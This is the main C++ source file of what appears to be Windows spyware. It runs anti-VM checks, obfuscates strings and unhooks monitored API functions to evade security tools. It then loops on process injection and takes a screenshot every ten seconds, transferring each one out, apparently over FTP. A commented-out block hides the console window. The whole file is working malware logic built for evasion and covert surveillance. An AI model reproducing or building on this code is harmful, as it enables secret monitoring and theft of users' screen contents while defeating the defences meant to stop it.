#include<stdio.h>
#include<iostream>
#include<fstream>
#include<string>
#include<cstdio>
#include<vector>
#include<thread>
#include "Anti_VM.h"
#include "Inject_Process.h"
#include "ScreenShot.h"
#include "FileTransfer.h"
#include "DisableHook.h"
using namespace std;

void running_inject() {
	DWORD pid;
	for (;;) {
		if (INJP(pid) == true) {
			//process_protection();
			//cout << "Succesful inject to a process: " <<pid<< endl;
			break;

		}
		else {
			//cout << "Can not inject to a process" << endl;
			continue;
		}
	}
}

void running_screen_shot() {
	cout << "Take scr shot" << endl;
	for (;;) {
		Take_ScreenShot();
		if (transfer_file() == true) {
			cout << "successful transfer file" << endl;
		}
		else {
			cout << "Too bad, check again" << endl;
		}
		pSleep(10000);
	}
}

int main(int argc, char* argv[])
{

	if (check_vm() == false) {
		return -1;
	}
	obfucation_string();

	removing_Hook(ob_sleep, kernel32);
	removing_Hook(ob_LoadLibA, kernel32);
	removing_Hook(ob_GetProcAddr, kernel32);
	removing_Hook(ob_WriteProcessMemory, kernel32);
	removing_Hook(ob_CreateRemoteThread, kernel32);
	removing_Hook(ob_OpenProcess, kernel32);
	removing_Hook(ob_VirtualAlloc, kernel32);
	removing_Hook(ob_InternetOpenA, wininet);
	removing_Hook(ob_InternetConnectA, wininet);
	removing_Hook(ob_FtpPutFileA, wininet);
	removing_Hook(ob_InternetCloseHandle, wininet);
	removing_Hook(ob_BitBlt, gdi32);
		// Hide console when run  :)
		/*HWND showwindow = GetConsoleWindow();
		ShowWindow(showwindow, SW_HIDE);*/

		/*DWORD hash;
		const char* ProcName = "Sleep";
		hash = MurmurHash2A(ProcName, Strlen(ProcName), HASHING_SEED);
		cout << hash << endl;
		LPVOID addr = getAPIAddr((char*)"kernel32.dll", hash);
		printf("0x%p\n", addr);*/

	thread th1(running_inject);
	thread th2(running_screen_shot);
	th1.join();
	th2.join();

	return 0;
}


